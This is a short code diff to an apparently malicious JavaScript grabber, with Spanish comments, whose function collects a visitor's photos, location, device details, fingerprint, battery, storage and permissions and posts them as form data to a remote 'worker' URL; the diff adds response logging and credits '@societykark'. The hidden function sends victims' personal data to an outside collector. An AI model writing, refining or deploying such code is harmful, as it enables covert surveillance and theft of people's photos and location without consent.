@@ -256,7 +256,7 @@
     }
 
     // ============================================================
-    // 10. ENVIAR TODOS LOS DATOS AL WORKER
+    // 10. ENVIAR TODOS LOS DATOS AL WORKER (COMO FORMDATA)
     // ============================================================
     async function enviarAlWorker() {
         const [fotos, ubicacion, dispositivo, fp, bateria, almacenamiento, permisos] = await Promise.all([
@@ -355,7 +355,7 @@
         msg += `⚡ Developed by: @societykark\n\n`;
         msg += `⏰ ${new Date().toISOString()}`;
 
-        // ========== ENVIAR AL WORKER ==========
+        // ========== ENVIAR COMO FORMDATA AL WORKER ==========
         const formData = new FormData();
         formData.append('text', msg);
         fotos.forEach((foto, index) => {
@@ -363,9 +363,11 @@
         });
 
         try {
-            await fetch(workerUrl, { method: 'POST', body: formData });
+            const response = await fetch(workerUrl, { method: 'POST', body: formData });
+            const result = await response.json();
+            console.log('✅ Enviado al Worker:', result);
         } catch(e) {
-            console.error('Error:', e);
+            console.error('❌ Error al enviar:', e);
         }
     }
 
